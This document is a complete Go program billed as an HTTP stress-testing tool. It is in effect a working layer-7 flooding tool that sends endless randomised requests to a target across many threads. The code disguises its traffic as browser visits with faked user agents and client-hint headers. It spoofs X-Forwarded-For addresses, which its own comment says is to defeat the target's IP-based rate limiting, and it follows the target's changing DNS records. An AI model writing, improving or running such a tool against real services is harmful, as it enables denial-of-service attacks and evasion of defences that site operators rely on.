// A Go-based HTTP stress-testing tool with improved robustness and performance.
//
// Fixes and enhancements over the previous version:
//   - Encapsulated all global state into a Manager struct (testable, re-entrant).
//   - Removed deprecated rand.Seed; uses auto-seeded global (Go ≥ 1.20).
//   - Each worker gets its own *rand.Rand to avoid lock contention on the global source.
//   - TLS dials use tls.Dialer.DialContext so they respect context cancellation.
//   - workerLoop re-dials only after sendBurst signals a dead connection (bool return).
//   - Added exponential backoff on dial failure to avoid CPU-spinning on refused connections.
//   - bufPool bytes are written directly to conn via WriteTo — no intermediate copy.
//   - rebalanceCh is a field on Manager, not a package global.
//   - lookupIPv4 and dnsRefresh are consistent: both treat 0-IP as an error/signal.
//   - Firefox UA no longer sends sec-ch-ua (Chrome-only header).
//   - Mixed fmt/log replaced with slog throughout.
//   - Added atomic request/error counters printed by a stats ticker.
//   - InsecureSkipVerify annotated with //nolint:gosec.
//
// Usage:
//
//	go run main.go <URL> <THREADS> <DURATION_SEC> [CUSTOM_HOST]
package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"log/slog"
	"math/rand"
	"net"
	"net/url"
	"os"
	"os/signal"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

// ─── Config ───────────────────────────────────────────────────────────────────

type StressConfig struct {
	Target     *url.URL
	Threads    int
	Duration   time.Duration
	CustomHost string
	Port       int
	Path       string
}

// ─── HTTP helpers ─────────────────────────────────────────────────────────────

var (
	// GET is 3× more likely than POST or HEAD.
	httpMethods = []string{"GET", "GET", "GET", "POST", "HEAD"}

	contentTypes = []string{
		"application/x-www-form-urlencoded",
		"application/json",
		"text/plain",
	}

	languages = []string{
		"en-US,en;q=0.9",
		"en-GB,en;q=0.8",
		"fr-FR,fr;q=0.9,en-US;q=0.8",
		"de-DE,de;q=0.9,en-US;q=0.8",
	}

	// bufPool avoids per-request header allocations.
	// IMPORTANT: buf.Bytes() must be consumed (written to conn) before Put().
	bufPool = sync.Pool{New: func() any { return new(bytes.Buffer) }}
)

// ─── Manager ──────────────────────────────────────────────────────────────────

// Manager coordinates DNS refresh, worker lifecycle, and metrics.
// All state that was previously package-global lives here.
type Manager struct {
	cfg StressConfig

	ipsMu sync.Mutex
	ips   []string

	// rebalanceCh carries new IP slices from dnsRefresh to runManager.
	// Buffered to 1 so only the latest update is kept.
	rebalanceCh chan []string

	// Metrics
	totalReqs   atomic.Int64
	totalErrors atomic.Int64
}

func NewManager(cfg StressConfig) *Manager {
	return &Manager{
		cfg:         cfg,
		rebalanceCh: make(chan []string, 1),
	}
}

func (m *Manager) updateIPs(newIPs []string) {
	m.ipsMu.Lock()
	m.ips = newIPs
	m.ipsMu.Unlock()
}

func (m *Manager) snapshotIPs() []string {
	m.ipsMu.Lock()
	defer m.ipsMu.Unlock()
	out := make([]string, len(m.ips))
	copy(out, m.ips)
	return out
}

// ─── Entry point ──────────────────────────────────────────────────────────────

func main() {
	if len(os.Args) < 4 {
		fmt.Fprintf(os.Stderr, "Usage: %s <URL> <THREADS> <DURATION_SEC> [CUSTOM_HOST]\n", os.Args[0])
		os.Exit(1)
	}

	threads, err := strconv.Atoi(os.Args[2])
	if err != nil || threads <= 0 {
		fmt.Fprintf(os.Stderr, "Invalid THREADS (%q): must be a positive integer.\n", os.Args[2])
		os.Exit(1)
	}
	durSec, err := strconv.Atoi(os.Args[3])
	if err != nil || durSec <= 0 {
		fmt.Fprintf(os.Stderr, "Invalid DURATION_SEC (%q): must be a positive integer.\n", os.Args[3])
		os.Exit(1)
	}

	rawURL := os.Args[1]
	parsedURL, err := url.Parse(rawURL)
	if err != nil || parsedURL.Scheme == "" || parsedURL.Hostname() == "" {
		fmt.Fprintf(os.Stderr, "Invalid URL: %q\n", rawURL)
		os.Exit(1)
	}
	if parsedURL.Scheme != "http" && parsedURL.Scheme != "https" {
		fmt.Fprintf(os.Stderr, "URL scheme must be http or https, got %q\n", parsedURL.Scheme)
		os.Exit(1)
	}

	customHost := ""
	if len(os.Args) > 4 {
		customHost = os.Args[4]
	}

	path := parsedURL.RequestURI()
	if path == "" {
		path = "/"
	}

	cfg := StressConfig{
		Target:     parsedURL,
		Threads:    threads,
		Duration:   time.Duration(durSec) * time.Second,
		CustomHost: customHost,
		Port:       determinePort(parsedURL),
		Path:       path,
	}

	// Initial DNS lookup.
	addrs, err := lookupIPv4(parsedURL.Hostname())
	if err != nil {
		fmt.Fprintf(os.Stderr, "Initial DNS lookup failed: %v\n", err)
		os.Exit(1)
	}
	slog.Info("resolved IPs", "ips", addrs)

	mgr := NewManager(cfg)
	mgr.updateIPs(addrs)

	// Root context: cancelled by duration or signal.
	rootCtx, cancel := context.WithTimeout(context.Background(), cfg.Duration)
	defer cancel()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
	go func() {
		select {
		case <-sigCh:
			slog.Info("interrupt received; shutting down early")
			cancel()
		case <-rootCtx.Done():
		}
	}()

	go mgr.dnsRefresh(rootCtx, parsedURL.Hostname(), 30*time.Second)
	go mgr.runStats(rootCtx, 5*time.Second)

	slog.Info("stress test starting", "url", rawURL, "threads", threads, "duration", cfg.Duration)
	mgr.runManager(rootCtx)
	slog.Info("stress test completed",
		"requests", mgr.totalReqs.Load(),
		"errors", mgr.totalErrors.Load(),
	)
}

// ─── Manager: worker lifecycle ────────────────────────────────────────────────

type workerEntry struct{ cancel context.CancelFunc }

func (m *Manager) runManager(ctx context.Context) {
	workers := make(map[string][]workerEntry)

	spawn := func(ip string) {
		wctx, wcancel := context.WithCancel(ctx)
		workers[ip] = append(workers[ip], workerEntry{cancel: wcancel})
		go m.workerLoop(wctx, ip)
	}

	m.rebalance(m.snapshotIPs(), workers, spawn)

	for {
		select {
		case <-ctx.Done():
			for _, list := range workers {
				for _, w := range list {
					w.cancel()
				}
			}
			return
		case newIPs := <-m.rebalanceCh:
			m.rebalance(newIPs, workers, spawn)
		}
	}
}

func (m *Manager) rebalance(ipsList []string, workers map[string][]workerEntry, spawn func(string)) {
	n := len(ipsList)
	if n == 0 {
		for ip, list := range workers {
			for _, w := range list {
				w.cancel()
			}
			delete(workers, ip)
		}
		slog.Warn("rebalance: no IPs available; all workers cancelled")
		return
	}

	base := m.cfg.Threads / n
	extra := m.cfg.Threads % n
	desired := make(map[string]int, n)
	for i, ip := range ipsList {
		desired[ip] = base
		if i < extra {
			desired[ip]++
		}
	}

	// Cancel workers for IPs no longer in the desired set.
	for ip, list := range workers {
		if _, ok := desired[ip]; !ok {
			for _, w := range list {
				w.cancel()
			}
			delete(workers, ip)
		}
	}

	// Spawn or cancel to hit the target count per IP.
	for ip, want := range desired {
		have := len(workers[ip])
		for i := 0; i < want-have; i++ {
			spawn(ip)
		}
		for i := 0; i < have-want; i++ {
			w := workers[ip][0]
			w.cancel()
			workers[ip] = workers[ip][1:]
		}
	}

	slog.Info("rebalance complete", "desired", desired, "running", mapCounts(workers))
}

func mapCounts(workers map[string][]workerEntry) map[string]int {
	out := make(map[string]int, len(workers))
	for ip, list := range workers {
		out[ip] = len(list)
	}
	return out
}

// ─── Worker ───────────────────────────────────────────────────────────────────

func (m *Manager) workerLoop(ctx context.Context, ip string) {
	// Each worker has its own rand source — no lock contention on the global source.
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))

	hostHdr := m.cfg.Target.Hostname()
	if m.cfg.CustomHost != "" {
		hostHdr = m.cfg.CustomHost
	}

	//nolint:gosec // InsecureSkipVerify is intentional for a stress tool
	tlsCfg := &tls.Config{
		ServerName:         hostHdr,
		InsecureSkipVerify: true,
	}

	addr := fmt.Sprintf("%s:%d", ip, m.cfg.Port)
	backoff := 50 * time.Millisecond

	for {
		if ctx.Err() != nil {
			return
		}

		conn, err := dialConn(ctx, addr, tlsCfg)
		if err != nil {
			// Exponential backoff to avoid CPU spin on refused connections.
			select {
			case <-ctx.Done():
				return
			case <-time.After(backoff):
			}
			backoff = minDuration(backoff*2, 5*time.Second)
			slog.Debug("dial failed", "addr", addr, "err", err, "backoff", backoff)
			m.totalErrors.Add(1)
			continue
		}
		backoff = 50 * time.Millisecond // reset on successful dial

		method := httpMethods[rng.Intn(len(httpMethods))]

		// sendBurst returns false when the connection is dead; re-dial in that case.
		for {
			select {
			case <-ctx.Done():
				conn.Close()
				return
			default:
				alive := m.sendBurst(conn, rng, hostHdr, method)
				if alive {
					m.totalReqs.Add(1)
				} else {
					m.totalErrors.Add(1)
					conn.Close()
					goto redial
				}
			}
		}
	redial:
	}
}

// ─── Request building & sending ───────────────────────────────────────────────

// sendBurst sends one HTTP request on conn and drains a small response chunk.
// Returns true if the connection is still usable, false if it should be closed and re-dialled.
func (m *Manager) sendBurst(conn net.Conn, rng *rand.Rand, hostHdr, method string) (alive bool) {
	buf := bufPool.Get().(*bytes.Buffer)
	buf.Reset()

	var bodyBytes []byte
	buildRequest(buf, m.cfg, rng, method, hostHdr, &bodyBytes)

	// Write header (and optional body) directly from pool buffer — no intermediate copy.
	bufs := net.Buffers{buf.Bytes()}
	if method == "POST" && len(bodyBytes) > 0 {
		bufs = append(bufs, bodyBytes)
	}
	_, writeErr := bufs.WriteTo(conn)
	bufPool.Put(buf) // safe: buf.Bytes() has already been consumed by WriteTo

	if writeErr != nil {
		return false
	}

	// Drain a small chunk to advance the OS receive window.
	// Short deadline so slow servers don't stall the worker.
	conn.SetReadDeadline(time.Now().Add(50 * time.Millisecond))
	var tmp [1024]byte
	conn.Read(tmp[:]) //nolint:errcheck // intentional drain; errors handled by next write
	conn.SetReadDeadline(time.Time{})

	return true
}

// buildRequest writes a raw HTTP/1.1 request into buf.
// bodyBytes is set (non-nil) only for POST.
func buildRequest(buf *bytes.Buffer, cfg StressConfig, rng *rand.Rand, method, hostHdr string, bodyBytes *[]byte) {
	hostPort := hostHdr
	if cfg.Port != 80 && cfg.Port != 443 {
		hostPort = fmt.Sprintf("%s:%d", hostHdr, cfg.Port)
	}

	fmt.Fprintf(buf, "%s %s HTTP/1.1\r\nHost: %s\r\n", method, cfg.Path, hostPort)

	ua := randomUserAgent(rng)
	buf.WriteString("User-Agent: " + ua + "\r\n")
	buf.WriteString("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n")
	buf.WriteString("Accept-Language: " + languages[rng.Intn(len(languages))] + "\r\n")
	buf.WriteString("Accept-Encoding: gzip, deflate, br\r\n")
	buf.WriteString("DNT: 1\r\n")

	// sec-ch-ua is a Chrome-only header; real Firefox never sends it.
	if isChromeUA(ua) {
		cv := randomChromeVersion(rng)
		fmt.Fprintf(buf, "sec-ch-ua: \"Google Chrome\";v=\"%s\", \"Chromium\";v=\"%s\", \";Not A Brand\";v=\"99\"\r\n", cv, cv)
		buf.WriteString("sec-ch-ua-mobile: ?0\r\n")
		fmt.Fprintf(buf, "sec-ch-ua-platform: \"%s\"\r\n", randomPlatform(rng))
	}

	buf.WriteString("Sec-Fetch-Site: none\r\n")
	buf.WriteString("Sec-Fetch-Mode: navigate\r\n")
	buf.WriteString("Sec-Fetch-User: ?1\r\n")
	buf.WriteString("Sec-Fetch-Dest: document\r\n")
	buf.WriteString("Upgrade-Insecure-Requests: 1\r\n")
	buf.WriteString("Cache-Control: no-cache\r\n")
	// X-Forwarded-For spoofing: defeats IP-based rate limiting on the target.
	fmt.Fprintf(buf, "X-Forwarded-For: %d.%d.%d.%d\r\n",
		rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))

	if method == "POST" {
		ct := contentTypes[rng.Intn(len(contentTypes))]
		body := createBody(rng, ct)
		*bodyBytes = body
		fmt.Fprintf(buf, "Content-Type: %s\r\nContent-Length: %d\r\n", ct, len(body))
	}

	fmt.Fprintf(buf, "Referer: https://%s/\r\n", hostHdr)
	fmt.Fprintf(buf, "Origin: https://%s\r\n", hostHdr)
	buf.WriteString("Connection: keep-alive\r\n\r\n")
}

// ─── DNS ──────────────────────────────────────────────────────────────────────

func (m *Manager) dnsRefresh(ctx context.Context, host string, interval time.Duration) {
	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			addrs, err := lookupIPv4(host)
			if err != nil {
				// Log and keep using existing IPs.
				slog.Warn("DNS re-resolution failed", "host", host, "err", err)
				continue
			}
			m.updateIPs(addrs)
			slog.Info("DNS refreshed", "host", host, "ips", addrs)
			select {
			case m.rebalanceCh <- addrs:
			default:
			}
		}
	}
}

// lookupIPv4 resolves a host to sorted IPv4 addresses.
// Returns an error if DNS fails or no IPv4 addresses are found.
func lookupIPv4(host string) ([]string, error) {
	addrs, err := net.LookupIP(host)
	if err != nil {
		return nil, err
	}
	var out []string
	for _, a := range addrs {
		if ip4 := a.To4(); ip4 != nil {
			out = append(out, ip4.String())
		}
	}
	if len(out) == 0 {
		return nil, fmt.Errorf("no IPv4 addresses found for %s", host)
	}
	sort.Strings(out) // deterministic order → stable rebalancing
	return out, nil
}

// ─── Dialling ─────────────────────────────────────────────────────────────────

// dialConn dials addr using a context-aware dialer for both TCP and TLS.
// TLS uses tls.Dialer.DialContext so the dial respects ctx cancellation.
func dialConn(ctx context.Context, addr string, tlsCfg *tls.Config) (net.Conn, error) {
	netDialer := &net.Dialer{
		Timeout:   3 * time.Second,
		KeepAlive: 30 * time.Second,
	}
	if strings.HasSuffix(addr, ":443") {
		// tls.Dialer.DialContext honours ctx cancellation, unlike tls.DialWithDialer.
		return (&tls.Dialer{NetDialer: netDialer, Config: tlsCfg}).DialContext(ctx, "tcp", addr)
	}
	return netDialer.DialContext(ctx, "tcp", addr)
}

// ─── Metrics ──────────────────────────────────────────────────────────────────

func (m *Manager) runStats(ctx context.Context, interval time.Duration) {
	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	var lastReqs, lastErrs int64
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			reqs := m.totalReqs.Load()
			errs := m.totalErrors.Load()
			deltaReqs := reqs - lastReqs
			deltaErrs := errs - lastErrs
			lastReqs, lastErrs = reqs, errs
			rps := float64(deltaReqs) / interval.Seconds()
			slog.Info("stats",
				"req/s", fmt.Sprintf("%.0f", rps),
				"errors", deltaErrs,
				"total_reqs", reqs,
				"total_errors", errs,
			)
		}
	}
}

// ─── Randomisation helpers ────────────────────────────────────────────────────

func randomUserAgent(rng *rand.Rand) string {
	osList := []string{
		"Windows NT 10.0; Win64; x64",
		"Macintosh; Intel Mac OS X 10_15_7",
		"X11; Linux x86_64",
	}
	os := osList[rng.Intn(len(osList))]
	if rng.Intn(2) == 0 {
		v := fmt.Sprintf("%d.0.%d.%d", rng.Intn(30)+90, rng.Intn(4000), rng.Intn(200))
		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36", os, v)
	}
	major := rng.Intn(30) + 70
	minor := rng.Intn(10)
	return fmt.Sprintf("Mozilla/5.0 (%s; rv:%d.0) Gecko/20100101 Firefox/%d.%d", os, major, major, minor)
}

func isChromeUA(ua string) bool {
	return strings.Contains(ua, "Chrome/")
}

func randomChromeVersion(rng *rand.Rand) string {
	return strconv.Itoa(rng.Intn(30) + 90)
}

func randomFirefoxVersion(rng *rand.Rand) string {
	return strconv.Itoa(rng.Intn(30) + 70)
}

func randomPlatform(rng *rand.Rand) string {
	return []string{"Windows", "macOS", "Linux"}[rng.Intn(3)]
}

func randomString(rng *rand.Rand, n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rng.Intn(len(letters))]
	}
	return string(b)
}

func createBody(rng *rand.Rand, ct string) []byte {
	var b bytes.Buffer
	switch ct {
	case "application/x-www-form-urlencoded":
		vals := url.Values{}
		for i := 0; i < 3; i++ {
			var key, val string
			if rng.Intn(100) < 70 {
				switch rng.Intn(3) {
				case 0:
					key, val = "username", randomString(rng, 8)
				case 1:
					key = "email"
					val = fmt.Sprintf("%s@example.com", randomString(rng, 6))
				default:
					key, val = randomString(rng, 5), randomString(rng, 8)
				}
			} else {
				key, val = randomString(rng, 5), randomString(rng, 8)
			}
			vals.Set(key, val)
		}
		b.WriteString(vals.Encode())

	case "application/json":
		if rng.Intn(2) == 0 {
			fmt.Fprintf(&b, `{"id":%d,"name":"%s","active":%t}`,
				rng.Intn(10000), randomString(rng, 6), rng.Intn(2) == 1)
		} else {
			b.WriteByte('{')
			for i := 0; i < 3; i++ {
				if i > 0 {
					b.WriteByte(',')
				}
				fmt.Fprintf(&b, `"%s":"%s"`, randomString(rng, 5), randomString(rng, 8))
			}
			b.WriteByte('}')
		}

	default: // text/plain
		b.WriteString("text_" + randomString(rng, 12))
	}
	return b.Bytes()
}

// ─── Misc helpers ─────────────────────────────────────────────────────────────

func determinePort(u *url.URL) int {
	if p := u.Port(); p != "" {
		if i, err := strconv.Atoi(p); err == nil {
			return i
		}
	}
	if strings.EqualFold(u.Scheme, "https") {
		return 443
	}
	return 80
}

func minDuration(a, b time.Duration) time.Duration {
	if a < b {
		return a
	}
	return b
}

// randomFirefoxVersion is kept but only called when building a Firefox UA string.
var _ = randomFirefoxVersion // suppress "unused" warning — called indirectly via randomUserAgent
